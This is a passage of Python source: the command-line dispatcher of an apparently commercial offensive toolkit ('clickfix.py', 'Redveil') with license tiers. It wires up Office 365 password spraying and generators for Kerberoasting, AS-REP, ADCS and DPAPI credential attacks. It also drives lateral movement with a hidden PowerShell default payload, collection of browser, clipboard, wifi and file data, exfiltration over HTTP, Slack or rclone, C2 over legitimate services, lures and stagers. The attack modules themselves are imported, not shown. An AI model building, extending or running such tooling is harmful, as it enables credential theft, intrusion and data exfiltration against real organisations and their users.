        from .creds import CredsError, generator, spray_o365

        if len(self.pos) < 2:
            err("creds spray|kerberoast|asrep|adcs|dpapi")
            raise SystemExit(2)
        sub = self.pos[1]
        if sub == "spray":
            users_file = self.pos[2] if len(self.pos) > 2 else ""
            if not users_file:
                raise SystemExit("creds spray <users.txt> --password P [--tenant T]")
            path = Path(users_file)
            if not path.exists():
                raise SystemExit(f"users file not found: {users_file}")
            upns = [line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]
            password = str(self.flags.get("password", ""))
            report = run_async(
                spray_o365(
                    upns,
                    password,
                    tenant=str(self.flags.get("tenant", "common")),
                    delay=_num(self.flags, "delay", 30, float),
                )
            )
            print(json_dumps({"outcomes": report.by_outcome(), "hits": report.hits(), "stopped": report.stopped}))
            if report.hits():
                ok(f"{len(report.hits())} valid credential(s)")
            return
        if sub in ("kerberoast", "asrep", "adcs", "dpapi"):
            try:
                out = generator(
                    sub,
                    target=str(self.flags.get("target", "HOST")),
                    domain=str(self.flags.get("domain", "corp.local")),
                    user=str(self.flags.get("user", "svc_account")),
                    **{"pass": str(self.flags.get("pass", "Password123!"))},
                    ca=str(self.flags.get("ca", "CORP-CA")),
                    template=str(self.flags.get("template", "Machine")),
                )
            except CredsError as exc:
                raise SystemExit(str(exc)) from None
            print(json_dumps(out))
            return
        err("creds spray|kerberoast|asrep|adcs|dpapi")
        raise SystemExit(2)

    # ─── lateral movement ───
    def cmd_lateral(self) -> None:
        from .lateral import KINDS, command

        if len(self.pos) < 2:
            err("lateral <kind> <host> [--user U] [--password P] [--domain D] [--payload C]")
            text(json_dumps(list(KINDS.keys())))
            raise SystemExit(2)
        kind = self.pos[1]
        host = self.pos[2] if len(self.pos) > 2 else ""
        if not host:
            raise SystemExit("lateral <kind> <host>")
        try:
            out = command(
                kind,
                host,
                user=str(self.flags.get("user", "Administrator")),
                password=str(self.flags.get("password", "Password123!")),
                domain=str(self.flags.get("domain", "CORP")),
                payload=str(self.flags.get("payload", "powershell -w h -nop -c whoami")),
                schedule_id=str(self.flags.get("schedule", "{00000000-0000-0000-0000-000000000001}")),
                gpo=str(self.flags.get("gpo", "Workstation Policy")),
                value=str(self.flags.get("value", "Updater")),
            )
        except KeyError as exc:
            raise SystemExit(str(exc.args[0])) from None
        print(json_dumps(out))

    # ─── collection ───
    def cmd_collect(self) -> None:
        from .collect import collector, list_kinds

        if len(self.pos) < 2:
            err("collect <screen|files|browser|clipboard|wifi>")
            text(json_dumps(list_kinds()))
            raise SystemExit(2)
        kind = self.pos[1]
        try:
            out = collector(
                kind,
                path=str(self.flags.get("path", "$env:USERPROFILE\\Documents")),
                limit=str(self.flags.get("limit", "20")),
            )
        except KeyError as exc:
            raise SystemExit(str(exc.args[0])) from None
        print(json_dumps(out))

    # ─── exfil ───
    def cmd_exfil(self) -> None:
        from .collect import exfil

        if len(self.pos) < 2:
            err("exfil <http|slack|rclone> [--url U] [--key K] [--path P]")
            raise SystemExit(2)
        kind = self.pos[1]
        try:
            out = exfil(
                kind,
                url=str(self.flags.get("url", "https://HOST/collect")),
                key=str(self.flags.get("key", "")),
                path=str(self.flags.get("path", "$env:TEMP\\staging.zip")),
            )
        except KeyError as exc:
            raise SystemExit(str(exc.args[0])) from None
        print(json_dumps(out))

    # ─── opsec preflight ───
    def cmd_opsec(self) -> None:
        from .opsec import format_checks, preflight, summary

        if len(self.pos) < 2 or self.pos[1] != "preflight":
            err("opsec preflight <url>")
            raise SystemExit(2)
        url = str(self.pos[2] if len(self.pos) > 2 else self.flags.get("url", ""))
        if not url:
            raise SystemExit("opsec preflight <url>")
        checks = run_async(preflight(url))
        text(format_checks(checks))
        print(json_dumps(summary(checks)))
        if any(not c.ok for c in checks):
            raise SystemExit(1)

    # ─── licensing ───
    def cmd_license(self) -> None:
        from .license import (
            LicenseError,
            deactivate,
            issue,
            load,
            parse,
            save,
        )

        sub = self.pos[1] if len(self.pos) > 1 else "status"
        if sub == "status":
            lic = load()
            if lic is None:
                lic = self.lic  # implicit demo
                text(c_yellow("  tier:     demo") + c_dim("  (no license file)"))
                text(c_dim("  limits:   2 campaigns, 5 targets, watermark on reports"))
                text(c_dim("  activate: clickfix.py license activate <key>"))
                return
            tier_colors = {"demo": c_yellow, "trial": c_cyan, "pro": c_green, "team": c_purple}
            tc = tier_colors.get(lic.tier, lambda s: s)
            import datetime as _dt

            expires_str = (
                _dt.datetime.fromtimestamp(lic.expires, tz=_dt.UTC).strftime("%Y-%m-%d")
                if lic.expires > 0
                else c_dim("never")
            )
            text(c_bold("  license"))
            text()
            _render_kv([
                ("tier", tc(lic.tier)),
                ("licensee", lic.licensee or c_dim("-")),
                ("active", c_green("yes") if lic.active else c_red("no")),
                ("expires", expires_str),
                ("days left", str(lic.days_left()) if lic.expires > 0 else c_dim("∞")),
                ("features", ", ".join(sorted(lic.tier_spec["features"])) or c_dim("-")),
            ])
            return
        if sub == "activate":
            if len(self.pos) < 3:
                raise SystemExit("license activate <CFIX1....key>")
            try:
                p = save(self.pos[2])
            except LicenseError as exc:
                err(str(exc))
                raise SystemExit(1) from None
            ok(f"license activated → {p}")
            return
        if sub == "deactivate":
            if deactivate():
                ok("license deactivated")
            else:
                text("no license file to remove")
            return
        if sub == "issue":
            tier = str(self.flags.get("tier", "pro"))
            days = self.flags.get("days")
            key, lic = issue(
                tier,
                licensee=str(self.flags.get("licensee", "unlicensed")),
                days=_num(self.flags, "days", 0, int) if days else None,
                seats=int(self.flags.get("seats", 1)),
            )
            print(json_dumps({"key": key, "license": lic.as_dict()}))
            return
        if sub == "verify":
            if len(self.pos) < 3:
                raise SystemExit("license verify <key>")
            try:
                lic = parse(self.pos[2])
            except LicenseError as exc:
                err(str(exc))
                raise SystemExit(1) from None
            print(json_dumps(lic.as_dict()))
            return
        err("license status|activate|deactivate|issue|verify")
        raise SystemExit(2)

    # ─── pro gui ───
    def cmd_gui(self) -> None:
        from .gui import RedveilGUI

        gui = RedveilGUI(
            self.store,
            host=str(self.flags.get("host", "127.0.0.1")),
            port=int(self.flags.get("port", 8888)),
            auth=not bool(self.flags.get("no-auth", False)),
        )
        open_browser = not bool(self.flags.get("no-browser", False))
        try:
            run_async(gui.run_forever(open_browser=open_browser))
        except KeyboardInterrupt:
            ok("gui stopped")

    def cmd_playbook(self) -> None:
        from .c2 import LegitServiceC2
        from .delivery import SaaSNotifyDelivery
        from .ext import ExtensionC2
        from .lure import LureBuilder
        from .relay import CloudRelay
        from .stager import Stager

        topic = self.pos[1] if len(self.pos) > 1 else "saas"
        table = {
            "saas": SaaSNotifyDelivery.provider_playbook,
            "c2": LegitServiceC2.privacy_notes,
            "ext": ExtensionC2.distribution_playbook,
            "relay": CloudRelay.deployment_playbook,
            "stager": Stager.kinds,
            "scenario": LureBuilder.list,
        }
        fn = table.get(topic)
        if fn is None:
            raise SystemExit(f"unknown playbook: {topic}")
        print(json_dumps(fn()))


def main(argv: list[str] | None = None) -> int:
    args = list(sys.argv[1:] if argv is None else argv)
    _configure_streams()
    set_color(detect_color(args))
    debug = "--debug" in args
    args = [a for a in args if a not in ("--debug", "--no-color", "--no-colour")]
    logging.basicConfig(
        level=logging.DEBUG if debug else logging.WARNING,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
    )
    return Cli(args).run()
